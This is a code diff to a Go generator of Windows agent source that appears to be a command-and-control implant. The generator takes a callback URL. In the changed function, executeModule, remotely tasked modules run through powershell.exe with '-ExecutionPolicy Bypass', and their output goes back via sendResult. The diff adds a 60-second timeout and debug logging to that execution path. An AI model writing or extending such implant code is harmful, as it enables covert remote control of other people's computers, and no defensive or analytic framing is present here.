@@ -539,6 +539,7 @@ func (g *Generator) generateWindowsSourceFull(opts Options, callbackURL string, 
 
 import (
 	"bytes"
+	"context"
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
@@ -1145,13 +1146,39 @@ func executeModule(taskID, moduleID string, task map[string]interface{}) {
 			{{end}}
 		}()
 		
-		// Execute PowerShell script file
+		// Execute PowerShell script file with timeout
 		cmd := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-File", tmpFile)
+		
+		// Create context with timeout (60 seconds for module execution)
+		ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
+		defer cancel()
+		
+		cmd = exec.CommandContext(ctx, "powershell.exe", "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-File", tmpFile)
+		
+		{{if .Debug}}
+		fmt.Printf("[DEBUG] Executing PowerShell script with 60s timeout...\n")
+		{{end}}
+		
 		output, err := cmd.CombinedOutput()
 		
+		{{if .Debug}}
+		if ctx.Err() == context.DeadlineExceeded {
+			fmt.Printf("[DEBUG] PowerShell execution timed out after 60 seconds\n")
+		}
 		if err != nil {
-			result := fmt.Sprintf("Error: %v\nOutput: %s", err, string(output))
-			sendResult("module", taskID, result)
+			fmt.Printf("[DEBUG] PowerShell execution error: %v\n", err)
+		}
+		fmt.Printf("[DEBUG] PowerShell output length: %d bytes\n", len(output))
+		{{end}}
+		
+		if err != nil {
+			if ctx.Err() == context.DeadlineExceeded {
+				result := fmt.Sprintf("Error: Module execution timed out after 60 seconds\nOutput (partial): %s", string(output))
+				sendResult("module", taskID, result)
+			} else {
+				result := fmt.Sprintf("Error: %v\nOutput: %s", err, string(output))
+				sendResult("module", taskID, result)
+			}
 		} else {
 			sendResult("module", taskID, string(output))
 		}
